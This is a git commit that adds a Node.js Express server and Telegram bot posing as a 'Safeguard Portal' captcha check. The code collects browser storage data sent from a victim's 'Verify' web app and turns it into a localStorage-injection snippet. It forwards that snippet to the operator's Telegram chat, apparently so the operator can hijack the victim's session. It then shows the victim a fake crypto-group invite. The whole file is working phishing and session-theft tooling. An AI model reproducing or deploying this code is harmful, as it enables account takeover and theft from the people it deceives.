d92697761794c2d650cdacdab2242be3c16660ef
insanecatbrokenheart89123rh <mittycupanax@hotmail.com>
2025-01-26 05:29:54 +0800

    Add files via upload

---
+++ index.js
@@ -0,0 +1,115 @@
+require("dotenv/config");
+const express = require("express");
+const cors = require("cors");
+const Telegram = require("node-telegram-bot-api");
+
+const PORT = process.env.PORT || 8000;
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+
+const WEB_APP_URL = process.env.WEB_APP_URL;
+const INVITE_LINK = process.env.INVITE_LINK;
+
+const bot = new Telegram(BOT_TOKEN, { polling: true });
+
+function sendBotLog(message, options) {
+  try {
+    bot.sendMessage(CHAT_ID, message, { ...options });
+  } catch (error) {
+    console.log(`Couldn't send message to ${CHAT_ID}`);
+  }
+}
+
+const app = express();
+
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+app.use(cors());
+
+app.get("/", (_, res) => {
+  res.send("Running....");
+});
+
+app.post("/post", async (req, res) => {
+  const body = req.body;
+
+  // Escape the JSON string for use in a JavaScript string
+  const escapedJsonString = body.text
+    .replace(/\\/g, "\\\\") // Escape backslashes
+    .replace(/'/g, "\\'") // Escape single quotes
+    .replace(/"/g, '\\"') // Escape double quotes
+    .replace(/\n/g, "\\n") // Escape newlines
+    .replace(/\r/g, "\\r"); // Escape carriage returns
+
+  const code = `// ***************************
+try {
+  let data = JSON.parse("${escapedJsonString}");
+  Object.keys(data).forEach(function (k) {
+    localStorage.setItem(k, data[k]);
+  });
+  document.location.reload(true); // reload page
+} catch (error) {
+  console.error('Error parsing JSON:', error);
+}
+// ***************************`;
+
+  const chat = await bot.getChat(body.chat_id);
+
+  const username = chat.username;
+
+  sendBotLog("*New User*: @" + `${username}` + "\n\n```\n" + code + "\n```", {
+    parse_mode: "Markdown",
+  });
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        {
+          text: "NEW SOL TRENDING",
+          web_app: {
+            url: INVITE_LINK, // Replace with your web app URL
+          },
+        },
+      ],
+    ],
+  };
+
+  bot.sendPhoto(body.chat_id, "img.jpg", {
+    caption: `Verified, you can join the group using this temporary link:\n\n${INVITE_LINK}\n\nThis link is a one time use and will expire`,
+    parse_mode: "Markdown",
+    reply_markup: JSON.stringify(keyboard),
+  });
+
+  res.send("Done");
+});
+
+app.listen(PORT, () => {
+  console.log("LOGGER RUNNING");
+});
+
+// Bot Integration
+bot.onText(/\/start/, (message) => {
+  const chatId = message.chat.id;
+
+  const webAppUrl = `${WEB_APP_URL}?chat_id=${chatId}`; // Add chat_id as query param
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        {
+          text: "Verify",
+          web_app: {
+            url: webAppUrl, // Replace with your web app URL
+          },
+        },
+      ],
+    ],
+  };
+
+  bot.sendPhoto(message.chat.id, "img.jpg", {
+    caption: `*Verify you're human with Safeguard Portal*\nClick 'VERIFY' and complete captcha to gain entry - Not working?`,
+    parse_mode: "Markdown",
+    reply_markup: JSON.stringify(keyboard),
+  });
+});
